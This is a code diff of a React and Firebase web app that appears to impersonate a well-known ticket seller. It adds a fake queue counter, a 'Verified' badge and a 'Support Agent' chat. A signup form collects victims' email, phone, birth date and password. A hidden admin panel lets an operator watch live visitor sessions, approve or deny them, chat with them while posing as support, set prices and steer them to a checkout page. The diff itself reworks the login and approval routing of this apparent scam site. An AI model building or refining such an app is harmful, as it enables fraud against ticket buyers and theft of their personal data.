@@ -41,7 +41,7 @@ const INITIAL_EVENTS = [
 export default function App() {
   const [user, setUser] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
-  const [currentPage, setCurrentPage] = useState('auth'); // DEFAULT TO AUTH
+  const [currentPage, setCurrentPage] = useState('auth'); 
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
   const [showCart, setShowCart] = useState(false);
@@ -50,22 +50,18 @@ export default function App() {
   const [eventsList, setEventsList] = useState([]); 
   const [sessionData, setSessionData] = useState({});
 
-  // UI State
   const [searchTerm, setSearchTerm] = useState('');
   const [showMobileSearch, setShowMobileSearch] = useState(false);
   const [lang, setLang] = useState('EN'); 
   const [showLangMenu, setShowLangMenu] = useState(false);
 
-  // Auth State
   const [authMode, setAuthMode] = useState('login'); 
   const [tempUser, setTempUser] = useState({ email: '', name: '', phone: '', dob: '', pass: '', agreed: false });
   const [authError, setAuthError] = useState('');
   
-  // Queue State
   const [queuePosition, setQueuePosition] = useState(2431);
   const [queueProgress, setQueueProgress] = useState(0);
 
-  // Admin & Chat
   const [isChatOpen, setIsChatOpen] = useState(false);
   const [chatMessages, setChatMessages] = useState([]);
   const [hasUnread, setHasUnread] = useState(false); 
@@ -76,7 +72,6 @@ export default function App() {
   const [adminUserInp, setAdminUserInp] = useState('');
   const [adminPassInp, setAdminPassInp] = useState('');
   
-  // Admin Dashboard
   const [adminTab, setAdminTab] = useState('requests'); 
   const [allSessions, setAllSessions] = useState([]);
   const [selectedUser, setSelectedUser] = useState(null); 
@@ -84,7 +79,6 @@ export default function App() {
   const [adminAlert, setAdminAlert] = useState('');
   const [newEvent, setNewEvent] = useState({ artist: '', venue: '', date: '', image: '', badge: '', timer: '' });
 
-  // --- MESSENGER LINK ---
   useEffect(() => {
     const p = new URLSearchParams(window.location.search);
     if (p.get('messenger') === '123' || p.get('messenger') === 'true') {
@@ -95,28 +89,24 @@ export default function App() {
     }
   }, []);
 
-  // --- AUTH OBSERVER (Redirect Logic) ---
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
         if (!u) { 
-            // If logged out, STAY ON AUTH PAGE unless Admin
             if (currentPage !== 'admin') setCurrentPage('auth');
             setIsLoading(false); 
         } else { 
             setUser(u); 
-            // If logged in, GO TO HOME (if currently on auth)
             if (currentPage === 'auth') {
                 await findOrCreateSession(u);
-                setCurrentPage('home');
             } else {
+                // If already inside (e.g. refresh), just re-sync session
                 await findOrCreateSession(u);
             }
             setIsLoading(false); 
         }
     });
-  }, []); // Run once on mount
+  }, []); 
 
-  // --- SESSION LOGIC ---
   const findOrCreateSession = async (authUser, defaultStatus) => {
       let sid = sessionStorage.getItem('tm_sid');
       if (!sid) {
@@ -140,39 +130,31 @@ export default function App() {
       const snap = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid));
       if (snap.exists()) {
           const d = snap.data();
-          // Routing Logic for Gates
           if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else if (d.status === 'waiting_approval') setCurrentPage('waiting_room');
-          else if (d.status === 'in_queue' && currentPage !== 'queue' && currentPage !== 'seatmap') setCurrentPage('queue');
+          else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('home'); // Go Home after login
+          else if (d.status === 'waiting_approval' && currentPage === 'auth') setCurrentPage('waiting_room');
       }
   };
 
-  // --- USER DATA LISTENER ---
   useEffect(() => {
     if (!currentSessionId) return;
     return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
       if(snap.exists()) {
         const d = snap.data();
         setSessionData(d);
-        
-        // Chat Logic
         const msgs = d.chatHistory || [];
         setChatMessages(msgs);
         if (msgs.length > 0 && msgs[msgs.length - 1].sender === 'system' && !isChatOpen) setHasUnread(true);
-
-        // Notification Logic
         const notifs = d.notifications || [];
         setUserNotifications(notifs);
         if(notifs.length > 0 && (!activeNotification || notifs[notifs.length-1].timestamp !== activeNotification?.timestamp)) setActiveNotification(notifs[notifs.length-1]);
         
-        // Routing
         if (d.accessGranted === 'denied') setCurrentPage('denied');
-        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
+        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('home'); // Approved -> Home
       }
     });
   }, [currentSessionId, currentPage, isChatOpen]);
 
-  // --- SYNC EVENTS & SETTINGS ---
   useEffect(() => {
     if(!user) return;
     const unsubSettings = onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), (snap) => {
@@ -191,7 +173,6 @@ export default function App() {
     return () => { unsubSettings(); unsubEvents(); };
   }, [user]);
 
-  // --- ADMIN LISTENER (Safety Checks Added) ---
   useEffect(() => {
     if (!isAdminLoggedIn) return;
     return onSnapshot(query(collection(db, 'artifacts', appId, 'public', 'data', 'sessions'), orderBy('createdAt', 'desc')), (snap) => {
@@ -199,7 +180,6 @@ export default function App() {
     });
   }, [isAdminLoggedIn]);
 
-  // --- QUEUE LOGIC ---
   useEffect(() => {
       if (currentPage === 'queue') {
           const interval = setInterval(() => {
@@ -215,15 +195,14 @@ export default function App() {
       }
   }, [currentPage]);
 
-  // --- ACTIONS ---
   const handleRealSignup = async () => {
       setAuthError(''); if (!tempUser.email || !tempUser.pass) return setAuthError('Missing fields');
-      try { const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await updateProfile(cred.user, { displayName: tempUser.name }); } catch (err) { setAuthError(err.message.replace('Firebase: ', '')); }
+      try { const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await updateProfile(cred.user, { displayName: tempUser.name }); await findOrCreateSession(cred.user, 'waiting_approval'); setCurrentPage('waiting_room'); } catch (err) { setAuthError(err.message.replace('Firebase: ', '')); }
   };
 
   const handleRealLogin = async () => {
       setAuthError(''); if (!tempUser.email || !tempUser.pass) return setAuthError('Missing fields');
-      try { await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); } catch (err) { setAuthError("Invalid Login"); }
+      try { const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await findOrCreateSession(cred.user); } catch (err) { setAuthError("Error: " + err.message); }
   };
 
   const handleExitDenied = async () => { sessionStorage.clear(); await signOut(auth); window.location.reload(); };
@@ -235,9 +214,8 @@ export default function App() {
     } else { alert("Invalid credentials."); }
   };
 
-  // --- ADMIN FUNCTIONS ---
   const updateSessionStatus = async (sid, status) => {
-      await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { accessGranted: status, status: status === 'allowed' ? 'in_queue' : 'blocked' });
+      await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { accessGranted: status, status: status === 'allowed' ? 'active' : 'blocked' });
   };
 
   const updateGlobalPrice = async (type, val) => {
@@ -269,11 +247,6 @@ export default function App() {
       await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'events', eid));
   };
 
-  const openChat = () => {
-      setIsChatOpen(true);
-      setHasUnread(false); // Clear Red Dot
-  };
-
   const updateSession = (updates) => { if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates); };
   
   const filteredEvents = eventsList.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
@@ -285,7 +258,7 @@ export default function App() {
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {/* HEADER (Only show if Logged In & Not Admin) */}
+      {/* HEADER */}
       {!isAdminLoggedIn && currentPage !== 'auth' && (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
@@ -312,9 +285,9 @@ export default function App() {
 
       <main className={`min-h-screen ${!isAdminLoggedIn ? 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto' : 'bg-[#f1f5f9] text-gray-900'}`}>
         
-        {/* AUTH (Now the Default Landing Page) */}
+        {/* AUTH */}
         {currentPage === 'auth' && (
-           <div className="fixed inset-0 z-50 bg-[#0a0e14] flex items-center justify-center p-4">
+           <div className="fixed inset-0 z-[100] bg-[#0a0e14] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
                  <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup'?txt.verifyTitle:txt.loginTitle}</h2><p className="text-xs font-bold text-gray-500 uppercase tracking-widest">{authMode==='signup'?txt.verifySub:txt.loginSub}</p></div>
                  <div className="space-y-3">
@@ -337,7 +310,7 @@ export default function App() {
               <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
               <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
             </div>
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'waiting_approval' }); setCurrentPage('waiting_room'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'in_queue' }); setCurrentPage('queue'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
           </div>
         )}
 
@@ -386,10 +359,9 @@ export default function App() {
           </div>
         )}
 
-        {/* --- ADMIN DASHBOARD --- */}
+        {/* ADMIN */}
         {currentPage === 'admin' && isAdminLoggedIn && (
            <div className="min-h-screen bg-[#f1f5f9] text-gray-900 pb-20 flex">
-              {/* SIDEBAR */}
               <div className={`w-full md:w-1/3 border-r border-gray-200 bg-white flex flex-col ${selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   <div className="p-4 border-b border-gray-100 flex justify-between items-center bg-[#f8fafc]">
                       <div className="flex items-center gap-2"><div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" /><h2 className="font-black text-sm uppercase italic">Live Sessions</h2></div>
@@ -434,8 +406,6 @@ export default function App() {
                       )}
                   </div>
               </div>
-
-              {/* MAIN CHAT */}
               <div className={`w-full md:w-2/3 bg-[#f1f5f9] flex flex-col ${!selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   {selectedUser ? (
                       <>
@@ -455,14 +425,11 @@ export default function App() {
         )}
       </main>
 
-      {!isAdminLoggedIn && currentPage !== 'auth' && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={openChat} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
-      
+      {!isAdminLoggedIn && currentPage !== 'auth' && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={()=>{setIsChatOpen(!isChatOpen); if(!isChatOpen) setHasUnread(false);}} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
       {isChatOpen && <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp"><div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10"><div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div><div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div></div><div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">{chatMessages.map((m,i) => (<div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}><div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div></div>))}</div><div className="p-3 bg-white border-t flex gap-2"><input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." /><button onClick={() => { const el = document.getElementById('chat-inp'); if(el.value.trim()) { const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}]; setChatMessages(newHistory); updateSession({ chatHistory: newHistory }); el.value = ''; } }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button></div></div>}
       
-      {/* CLICKABLE CART */}
       {cart.length > 0 && <div onClick={() => setShowCart(true)} className="fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 p-6 z-50 animate-slideUp shadow-[0_-10px_40px_rgba(0,0,0,0.1)] cursor-pointer hover:bg-gray-50 transition-colors"><div className="max-w-7xl mx-auto flex items-center justify-between"><div><p className="text-xs font-black text-gray-400 uppercase tracking-widest">Total (Tap to view)</p><p className="text-3xl font-black text-gray-900">${cart.reduce((a,b) => a + b.price, 0)}</p></div><button onClick={(e) => { e.stopPropagation(); setCurrentPage('checkout'); }} className="bg-[#026cdf] text-white px-8 lg:px-12 py-4 rounded-full font-black uppercase italic tracking-widest shadow-[0_10px_30px_rgba(2,108,223,0.4)] hover:scale-105 active:scale-95 transition-all">Proceed to Pay</button></div></div>}
       
-      {/* SHOW CART MODAL */}
       {showCart && (
             <div className="fixed inset-0 z-[300] bg-black/80 flex items-center justify-center p-4 animate-fadeIn">
                 <div className="bg-[#1f262d] w-full max-w-md rounded-3xl p-6 border border-white/10 shadow-2xl">
@@ -482,5 +449,4 @@ export default function App() {
     </div>
   );
 }
-
 
